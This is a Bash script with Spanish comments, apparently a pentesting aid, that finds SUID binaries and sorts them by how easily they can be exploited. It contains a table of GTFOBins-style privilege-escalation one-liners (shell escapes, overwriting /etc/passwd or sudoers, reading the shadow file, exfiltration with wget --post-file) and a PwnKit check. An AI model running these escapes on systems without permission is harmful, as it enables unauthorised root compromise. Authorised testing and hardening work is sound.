#!/usr/bin/env bash
# suid-triage.sh — clasificador rápido de binarios SUID para privesc
# Autor: datefer  ·  https://github.com/datefer1989/datefer-offsec
#
# Qué hace: busca binarios SUID y los reparte en 3 cubos ->
#   [!] EXPLOTABLE  : está en GTFOBins (técnica conocida) -> empieza por aquí
#   [?] NO ESTANDAR : no es del sistema base -> investiga su VERSION (searchsploit/GTFOBins)
#   [.] normal      : SUID legítimo del sistema -> normalmente ignóralo (*pkexec: ojo PwnKit)
#
# NO sustituye a GTFOBins/LinPEAS: es un triador para saber DÓNDE mirar primero.
# Uso:   ./suid-triage.sh            (busca en / )
#        ./suid-triage.sh /ruta      (acota la búsqueda)
#        ./suid-triage.sh -n ...     (sin colores)

set -o pipefail

# ---- colores (degradan a vacío si no hay TTY o se pasa -n) ----
if [[ "$1" == "-n" ]]; then NOCOLOR=1; shift; fi
if [[ -t 1 && -z "$NOCOLOR" ]]; then
  R=$'\e[31m'; Y=$'\e[33m'; G=$'\e[32m'; B=$'\e[1m'; D=$'\e[2m'; X=$'\e[0m'
else R=; Y=; G=; B=; D=; X=; fi

SEARCH="${1:-/}"

# ---- SUID explotables conocidos (GTFOBins, categoría SUID) + pista ----
declare -A EXPLO=(
  [bash]="bash -p" [sh]="sh -p (si lo honra)" [dash]="dash -p" [ash]="ash" [zsh]="zsh" [ksh]="ksh"
  [vim]=":set shell=/bin/sh|:shell  (o -c ':py3 ...')" [vi]=":!/bin/sh" [rvim]="python escape" [view]="vim"
  [nano]="^R^X  reset; sh 1>&0 2>&0" [ed]="!/bin/sh" [emacs]="-Q -nw --eval term"
  [less]="!/bin/sh" [more]="!/bin/sh  (o v->:!sh)" [man]="!/bin/sh" [pg]="!/bin/sh"
  [awk]="awk 'BEGIN{system(\"/bin/sh\")}'" [gawk]="idem awk" [mawk]="idem awk" [nawk]="idem awk"
  [find]="find . -exec /bin/sh -p \\; -quit" [nmap]="(viejo) --interactive  !sh" [perl]="perl -e 'exec \"/bin/sh\";'"
  [python]="os.execl/ os.system('/bin/sh')" [python2]="idem" [python3]="os.execl('/bin/sh',...)" [ruby]="exec '/bin/sh'" [lua]="os.execute('/bin/sh')"
  [php]="pcntl_exec('/bin/sh',['-p'])  (NO system: baja euid)" [node]="child_process.spawn /bin/sh" [tclsh]="exec /bin/sh <@stdin ..."
  [gdb]="-nx -ex 'py os.execl...' -ex quit" [make]="-s --eval=\$\$(sh)" [gcc]="(no directo) usa como wrapper" [expect]="spawn /bin/sh; interact"
  [env]="env /bin/sh -p" [nice]="nice /bin/sh -p" [nohup]="nohup /bin/sh -p" [stdbuf]="stdbuf -i0 /bin/sh -p" [time]="(busybox) time /bin/sh"
  [taskset]="taskset 1 /bin/sh -p" [timeout]="timeout 7d /bin/sh -p" [ionice]="ionice /bin/sh -p" [setarch]="setarch \$(arch) /bin/sh -p" [watch]="watch -x sh -c 'reset; sh 1>&0'"
  [flock]="flock -u / /bin/sh -p" [start-stop-daemon]="-n x -S -x /bin/sh -- -p" [unshare]="unshare -r /bin/sh"
  [cp]="copia /etc/passwd o sobrescribe (file write)" [mv]="file write/replace" [dd]="dd of=/etc/passwd (file write)" [tee]="file write (append root)"
  [chmod]="file-mode (p.ej. +s a bash)" [chown]="cambia dueño (file write indirecto)" [install]="install -m x (file write)"
  [cat]="file read (shadow/keys)" [head]="file read" [tail]="file read" [od]="file read" [hexdump]="file read" [xxd]="file read" [base64]="file read (b64)" [base32]="file read" [sort]="file read" [nl]="file read" [cut]="file read" [strings]="file read"
  [sed]="sed -n '1e exec sh' / (o file read/write)" [grep]="grep '' file (file read)" [rev]="rev file (file read)"
  [tar]="--checkpoint=1 --checkpoint-action=exec=sh" [zip]="zip x -T -TT 'sh #'" [cpio]="(file write via -p)" [rsync]="-e 'sh -c sh 0<&2 1>&2'"
  [wget]="--post-file (exfil) / file read" [curl]="file read/escribe con -o (file write)" [tftp]="get/put (file transfer)" [ftp]="!/bin/sh"
  [openssl]="(file read/write, reverse engine)" [socat]="socat stdin exec:/bin/sh" [strace]="strace -o /dev/null /bin/sh -p"
  [docker]="docker run -v /:/mnt --rm -it IMG chroot /mnt sh" [systemctl]="unit malicioso ExecStart -> start" [dmsetup]="create -> shell"
  [busybox]="busybox sh" [xargs]="xargs -a /dev/null sh -p" [dosbox]="file write -> /etc/sudoers o /etc/passwd" [sqlite3]="sqlite3 /dev/null '.shell /bin/sh'"
  [date]="date -f file (file read)" [dialog]="--textbox file (file read)" [capsh]="capsh --gid=0 --uid=0 -- (si tiene caps)"
  [ssh-keygen]="-D ./lib.so (carga .so)" [git]="PAGER / -c core.pager / !sh en modo paginado"
)

# ---- SUID normales del sistema (no son hallazgo por sí solos) ----
declare -A BASE=(
  [ping]=1 [ping6]=1 [su]=1 [sudo]=1 [mount]=1 [umount]=1 [passwd]=1 [chsh]=1 [chfn]=1
  [newgrp]=1 [gpasswd]=1 [fusermount]=1 [fusermount3]=1 [ntfs-3g]=1 [at]=1 [crontab]=1
  [expiry]=1 [ssh-keysign]=1 [mount.nfs]=1 [mount.cifs]=1 [umount.nfs]=1
  [dbus-daemon-launch-helper]=1 [polkit-agent-helper-1]=1 [snap-confine]=1
  [vmware-user-suid-wrapper]=1 [Xorg]=1 [chrome-sandbox]=1 [login]=1 [unix_chkpwd]=1
)

echo "${B}[*] Buscando SUID en ${SEARCH} ...${X}"
mapfile -t FILES < <(find "$SEARCH" -perm -4000 -type f 2>/dev/null | sort -u)

if [[ ${#FILES[@]} -eq 0 ]]; then echo "${Y}[!] Sin resultados (¿permiso? ¿ruta?).${X}"; exit 0; fi

explo=(); nonstd=(); norm=()
for f in "${FILES[@]}"; do
  b=$(basename "$f")
  if [[ -n "${EXPLO[$b]}" ]]; then explo+=("$f|$b");
  elif [[ -n "${BASE[$b]}" ]]; then norm+=("$f|$b");
  else nonstd+=("$f|$b"); fi
done

if [[ ${#explo[@]} -gt 0 ]]; then
  echo; echo "${R}${B}[!] EXPLOTABLE CONOCIDO (GTFOBins) — empieza por aquí:${X}"
  for e in "${explo[@]}"; do f=${e%%|*}; b=${e##*|}; printf "    ${R}%-28s${X} %s${D}-> %s${X}\n" "$f" "" "${EXPLO[$b]}"; done
fi
if [[ ${#nonstd[@]} -gt 0 ]]; then
  echo; echo "${Y}${B}[?] NO ESTANDAR — investiga su VERSION (searchsploit / GTFOBins / --help):${X}"
  for e in "${nonstd[@]}"; do f=${e%%|*}; printf "    ${Y}%s${X}\n" "$f"; done
fi
if [[ ${#norm[@]} -gt 0 ]]; then
  echo; echo "${G}[.] Normales del sistema (ignóralos; *pkexec=PwnKit CVE-2021-4034 si es viejo):${X}"
  for e in "${norm[@]}"; do f=${e%%|*}; printf "    ${D}%s${X}\n" "$f"; done
fi
# pkexec aparte: es "normal" pero con CVE famosa
if printf '%s\n' "${FILES[@]}" | grep -q '/pkexec$'; then
  echo; echo "${R}${B}[!] pkexec presente -> comprueba PwnKit (CVE-2021-4034), polkit < 0.120${X}"
fi
echo; echo "${D}Recuerda: SUID shell suele soltar euid -> usa -p / pcntl_exec. euid=0 YA es root.${X}"
